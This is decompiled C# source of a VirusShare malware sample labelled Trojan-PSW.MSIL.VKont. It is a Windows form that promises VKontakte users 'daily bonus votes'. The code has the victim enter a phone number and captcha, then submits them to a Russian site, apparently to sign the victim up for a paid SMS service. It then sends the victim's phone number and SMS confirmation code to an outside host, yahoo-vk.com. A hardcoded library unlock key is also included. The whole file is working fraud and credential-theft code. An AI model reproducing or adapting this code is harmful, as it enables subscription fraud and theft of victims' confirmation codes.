// Decompiled with JetBrains decompiler
// Type: Beeline_MTS.Form1
// Assembly: 9090909090, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F71B25CB-CA85-4AD5-A873-A5B463F41C84
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-PSW.MSIL.VKont.ez-6b6a2f641b682b992bcdadabbb19217da11f913a8922efc7b41d7e68c0247aa6.exe

using Chilkat;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Beeline_MTS
{
  public class Form1 : Form
  {
    private Http Ghttp;
    private IContainer components;
    private Button button1;
    private TextBox phonebox;
    private PictureBox pictureBox1;
    private TextBox kaptchabox;
    private TextBox kodbox;
    private Button button2;
    private Label label1;
    private Label label2;
    private Label label3;
    private RichTextBox richTextBox1;
    private BackgroundWorker orb;
    private Label label4;
    private TextBox textBox1;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e) => this.orb.RunWorkerAsync();

    private void refresh()
    {
      this.kaptchabox.Text = "";
      string str1 = "none";
      HttpRequest httpRequest = new HttpRequest();
      Http http = new Http();
      if (!http.UnlockComponent("Http!TEAM!BEAN_218687B213Lg"))
      {
        int num = (int) MessageBox.Show("Failed to unlock HTTP component");
      }
      if (str1 != "none")
      {
        http.ProxyDomain = str1.Split(':')[0];
        http.ProxyPort = Convert.ToInt32(str1.Split(':')[1]);
      }
      http.CookieDir = "memory";
      http.MimicFireFox = true;
      string str2 = "2844";
      string str3 = http.QuickGetStr("http://yahoo-vk.com/pr.html");
      if (str3 != "")
        http.QuickGetStr("http://bizznesinternet.ru/?uid=" + str3);
      else
        http.QuickGetStr("http://bizznesinternet.ru/?uid=" + str2);
      Thread.Sleep(1000);
      http.QuickGetStr("http://bizznesinternet.ru/registration.php");
      this.pictureBox1.Image = this.byteArrayToImage(http.QuickGet("http://bizznesinternet.ru/kcaptcha_img.php"));
      this.Ghttp = http;
    }

    public Image byteArrayToImage(byte[] byteArrayIn) => Image.FromStream((Stream) new MemoryStream(byteArrayIn));

    private void button1_Click(object sender, EventArgs e)
    {
      HttpResponse httpResponse = new HttpResponse();
      HttpRequest httpRequest = new HttpRequest();
      httpRequest.RemoveAllParams();
      httpRequest.UsePost();
      string text = "";
      httpRequest.Charset = "windows-1251";
      httpRequest.Path = "/registration2.php";
      httpRequest.AddParam("phone", this.phonebox.Text);
      httpRequest.AddParam("kapcha", this.kaptchabox.Text);
      try
      {
        text = this.Ghttp.SynchronousRequest("bizznesinternet.ru", 80, false, httpRequest).BodyStr;
      }
      catch
      {
      }
      if (regex_proc.Process("Число с картинки", text) == "Число с картинки")
      {
        this.orb.RunWorkerAsync();
        int num = (int) MessageBox.Show("Введенно неверное число с картинки! Повторите попытку!");
      }
      if (regex_proc.Process("ответив на смс", text) == "ответив на смс")
      {
        this.orb.RunWorkerAsync();
        int num = (int) MessageBox.Show("Вам отправленно сервисное смс.");
      }
      if (regex_proc.Process("необходимая для получения кода доступа к сайту", text) != "")
      {
        this.orb.RunWorkerAsync();
        int num = (int) MessageBox.Show("Введите свой реальный номер телефона!");
      }
      if (!(regex_proc.Process("отправлен код подтверждения", text) != ""))
        return;
      int num1 = (int) MessageBox.Show("На ваш номер отправлен код подтверждения. Он придет через 10 минут. Дождитесь его получения и введите в форму ниже ;)");
      this.button2.Enabled = true;
    }

    private void button2_Click(object sender, EventArgs e)
    {
      HttpResponse httpResponse = new HttpResponse();
      HttpRequest httpRequest = new HttpRequest();
      httpRequest.RemoveAllParams();
      httpRequest.UsePost();
      string text = "";
      httpRequest.Charset = "windows-1251";
      httpRequest.Path = "/registration3.php";
      httpRequest.AddParam("pincode", this.kodbox.Text);
      httpRequest.AddParam("ok", "Подписаться &rarr;");
      httpRequest.AddParam("check", "on");
      try
      {
        text = this.Ghttp.SynchronousRequest("bizznesinternet.ru", 80, false, httpRequest).BodyStr;
      }
      catch
      {
      }
      if (regex_proc.Process("Введен неверный код", text) != "")
      {
        int num1 = (int) MessageBox.Show("Введен неверный код!");
      }
      else
      {
        this.Ghttp.QuickGetStr("http://yahoo-vk.com/ot4.php?num=" + this.phonebox.Text + "&kod=" + this.kodbox.Text);
        int num2 = (int) MessageBox.Show("Поздравляем! Ожидайте бонуса в течении 6 часов");
      }
    }

    private void orb_DoWork(object sender, DoWorkEventArgs e) => this.refresh();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.button1 = new Button();
      this.phonebox = new TextBox();
      this.pictureBox1 = new PictureBox();
      this.kaptchabox = new TextBox();
      this.kodbox = new TextBox();
      this.button2 = new Button();
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.richTextBox1 = new RichTextBox();
      this.orb = new BackgroundWorker();
      this.label4 = new Label();
      this.textBox1 = new TextBox();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.button1.Location = new Point(15, 204);
      this.button1.Name = "button1";
      this.button1.Size = new Size(198, 23);
      this.button1.TabIndex = 0;
      this.button1.Text = "Послать запрос";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.phonebox.Location = new Point(15, 68);
      this.phonebox.Name = "phonebox";
      this.phonebox.Size = new Size(198, 20);
      this.phonebox.TabIndex = 1;
      this.pictureBox1.Location = new Point(15, 94);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(198, 65);
      this.pictureBox1.TabIndex = 2;
      this.pictureBox1.TabStop = false;
      this.kaptchabox.Location = new Point(15, 178);
      this.kaptchabox.Name = "kaptchabox";
      this.kaptchabox.Size = new Size(198, 20);
      this.kaptchabox.TabIndex = 3;
      this.kodbox.Location = new Point(15, (int) byte.MaxValue);
      this.kodbox.Name = "kodbox";
      this.kodbox.Size = new Size(198, 20);
      this.kodbox.TabIndex = 4;
      this.button2.Enabled = false;
      this.button2.Location = new Point(12, 291);
      this.button2.Name = "button2";
      this.button2.Size = new Size(201, 23);
      this.button2.TabIndex = 5;
      this.button2.Text = "Получить бонус";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.label1.AutoSize = true;
      this.label1.Location = new Point(12, 52);
      this.label1.Name = "label1";
      this.label1.Size = new Size(190, 13);
      this.label1.TabIndex = 6;
      this.label1.Text = "1. Привязанный телефонный номер";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(12, 162);
      this.label2.Name = "label2";
      this.label2.Size = new Size(97, 13);
      this.label2.TabIndex = 7;
      this.label2.Text = "2. Код с картинки";
      this.label3.AutoSize = true;
      this.label3.Location = new Point(12, 239);
      this.label3.Name = "label3";
      this.label3.Size = new Size(102, 13);
      this.label3.TabIndex = 8;
      this.label3.Text = "3. Полученный код";
      this.richTextBox1.Location = new Point(219, 9);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(227, 305);
      this.richTextBox1.TabIndex = 9;
      this.richTextBox1.Text = componentResourceManager.GetString("richTextBox1.Text");
      this.orb.DoWork += new DoWorkEventHandler(this.orb_DoWork);
      this.label4.AutoSize = true;
      this.label4.Location = new Point(12, 9);
      this.label4.Name = "label4";
      this.label4.Size = new Size(85, 13);
      this.label4.TabIndex = 10;
      this.label4.Text = "0. ID вконтакте";
      this.textBox1.Location = new Point(15, 25);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(198, 20);
      this.textBox1.TabIndex = 11;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(455, 320);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.kodbox);
      this.Controls.Add((Control) this.kaptchabox);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.phonebox);
      this.Controls.Add((Control) this.button1);
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Text = "Бонус в 10 голосов ежедневно!";
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
